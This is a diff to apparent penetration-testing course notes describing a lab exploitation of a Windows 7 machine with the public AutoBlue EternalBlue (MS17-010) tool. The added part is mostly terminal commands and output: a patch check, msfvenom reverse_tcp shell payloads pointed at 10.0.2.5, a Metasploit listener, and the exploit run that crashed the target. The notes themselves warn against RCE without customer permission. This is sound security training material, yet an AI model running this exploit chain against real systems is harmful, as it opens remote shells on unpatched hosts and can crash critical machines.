@@ -241,9 +241,110 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 One could also search manually for code that allows us **Remote Code Execution
 (RCE)** on the victim machine. TCM has demonstrated this with this [Github
 repository](https://github.com/3ndG4me/AutoBlue-MS17-010). He prefers exploits
-with good documentation and good a how-to guide.
+with good documentation, a good how-to guide, recent commits and a decent number
+of positive ratings.
 
 The exploit led to the victim machine crashing (blue screen), which led TCM to
 warn of the dangers of RCE in pentests without the customers' explicit
 permission. If a critical machine crashed e.g. in a hospital, the consequences
 might be servere.
+
+
+
+┌──(venv)─(kali㉿kali)-[~/Capstone/Blue/AutoBlue-MS17-010]
+└─$ python eternal_checker.py 10.0.2.15
+[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+
+
+
+┌──(venv)─(kali㉿kali)-[~/Capstone/Blue/AutoBlue-MS17-010/shellcode]
+└─$ ./shell_prep.sh
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+10.0.2.5
+LPORT you want x64 to listen on:
+9999
+LPORT you want x86 to listen on:
+2222
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+0
+Generating x64 cmd shell (staged)...
+
+msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.0.2.5 LPORT=9999
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 511 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (staged)...
+
+msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.0.2.5 LPORT=2222
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 375 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+
+
+
+┌──(venv)─(kali㉿kali)-[~/Capstone/Blue/AutoBlue-MS17-010]
+└─$ ./listener_prep.sh 
+  __
+  /,-
+  ||)
+  \\_, )
+   `--'
+Eternal Blue Metasploit Listener
+
+LHOST for reverse connection:
+10.0.2.5
+LPORT for x64 reverse connection:
+9999
+LPORT for x86 reverse connection:
+2222
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+1
+Type 0 if this is a staged payload or 1 if it is for a stageless payload: 0
+Starting listener (staged)...
+Starting postgresql (via systemctl): postgresql.service.
+Metasploit tip: The use command supports fuzzy searching to try and 
+select the intended module, e.g. use kerberos/get_ticket or use 
+kerberos forge silver ticket
+
+(--- snip ---)
+
+
+
+┌──(kali㉿kali)-[~/Capstone/Blue/AutoBlue-MS17-010]
+└─$ python eternalblue_exploit7.py 10.0.2.15 ./shellcode/sc_all.bin
+shellcode size: 2307
+numGroomConn: 13
+Target OS: Windows 7 Ultimate 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+
+(--- clip ---)
+
+<img src="./images/07__eternalbluescreen.png" alt="Victim crashed in manual exploit" width="800"/>
